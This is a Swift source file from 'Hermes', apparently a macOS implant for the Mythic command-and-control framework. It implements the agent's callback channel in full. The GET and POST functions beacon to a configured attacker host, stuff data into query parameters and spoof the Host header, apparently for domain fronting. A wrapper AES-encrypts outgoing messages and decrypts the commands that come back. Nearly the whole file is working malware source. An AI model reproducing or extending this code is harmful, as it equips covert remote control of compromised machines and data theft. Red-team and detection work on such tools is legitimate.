//
//  http.swift
//  Hermes
//
//  Created by slyd0g on 5/23/21.
//

import Foundation

// https://stackoverflow.com/questions/39535256/need-to-make-two-http-network-requests-simultaneously-with-a-completion-handler
let dispatch = DispatchGroup()

// GET function
func get(data: String) -> String {
    dispatch.enter()
    var results = ""
    
    // Prepare URL
    var getURLComponents = URLComponents()
    
    getURLComponents.host = agentConfig.callbackHost
    getURLComponents.path = agentConfig.getRequestURI
    getURLComponents.port = agentConfig.callbackPort
    // Stuffing data into query parameter
    getURLComponents.queryItems = [URLQueryItem(name: agentConfig.queryParameter, value: data)]
    if (agentConfig.useSSL) {
        getURLComponents.scheme = "https"
    }
    else
    {
        getURLComponents.scheme = "http"
    }
    
    // Prepare URL Request Object
    let url = getURLComponents.url
    guard let requestUrl = url else { fatalError() }
    var request = URLRequest(url: requestUrl)
    request.httpMethod = "GET"
    request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
    if agentConfig.hostHeader == "" {
        request.setValue(agentConfig.callbackHost, forHTTPHeaderField: "Host")
    }
    else {
        request.setValue(agentConfig.hostHeader, forHTTPHeaderField: "Host")
    }
    
    // Perform HTTP Request
    let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, _, _ in
         results = String(data: data!, encoding: .utf8)!
        dispatch.leave()
    }
    task.resume()
    dispatch.wait()
    return results
}

// POST function
func post(data: String) -> String {
    dispatch.enter()
    var results = ""
    
    // Prepare URL
    var postURLComponents = URLComponents()
    
    postURLComponents.host = agentConfig.callbackHost
    postURLComponents.path = agentConfig.postRequestURI
    postURLComponents.port = agentConfig.callbackPort
    if (agentConfig.useSSL) {
        postURLComponents.scheme = "https"
    }
    else
    {
        postURLComponents.scheme = "http"
    }
    
    // Prepare URL Request Object, set HTTP headers
    let url = postURLComponents.url
    guard let requestUrl = url else { fatalError() }
    var request = URLRequest(url: requestUrl)
    request.httpMethod = "POST"
    request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
    if agentConfig.hostHeader == "" {
        request.setValue(agentConfig.callbackHost, forHTTPHeaderField: "Host")
    }
    else {
        request.setValue(agentConfig.hostHeader, forHTTPHeaderField: "Host")
    }
    if !agentConfig.httpHeaders.isEmpty {
        for header in agentConfig.httpHeaders {
            request.setValue(header.value, forHTTPHeaderField: header.key)
        }
    }
    
    // Set HTTP Request Body
    request.httpBody = data.data(using: String.Encoding.utf8);
    // Perform HTTP Request
    let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, _, _ in
        results = String(data: data!, encoding: .utf8)!
        dispatch.leave()
    }
    task.resume()
    dispatch.wait()
    return results
}

// Wrapper to send Hermes message, accepts a JSON and returns decoded/decrypted JSON from Mythic
func sendHermesMessage(jsonMessage: JSON, payloadUUID: Data, decodedAESKey: Data, httpMethod: String) -> JSON {
    // Generate iv, encrypt message, and determine hmac
    let iv = generateIV()
    let ciphertext = try! CC.crypt(.encrypt, blockMode: .cbc, algorithm: .aes, padding: .pkcs7Padding, data: jsonMessage.rawData(), key: decodedAESKey, iv: iv)
    let hmac = CC.HMAC(iv+ciphertext, alg: .sha256, key: decodedAESKey)

    // Assemble staging_rsa message B64(PayloadUUID + IV + Ciphertext + HMAC)
    let hermesMessage = toBase64(data: payloadUUID + iv + ciphertext + hmac)

    // Send message to Mythic
    var mythicMessage = ""
    if (httpMethod == "get") {
        mythicMessage = get(data: toBase64URL(base64: hermesMessage))
    }
    else {
        mythicMessage = post(data: hermesMessage)
    }

    // Decode and decrypt Mythic message to JSON string
    let decryptedMythicMessage = decryptMythicMessage(mythicMessage: mythicMessage, key: decodedAESKey, iv: iv)

    // Convert JSON string to object
    let jsonResponse = JSON.init(parseJSON:decryptedMythicMessage)
    
    return jsonResponse
}
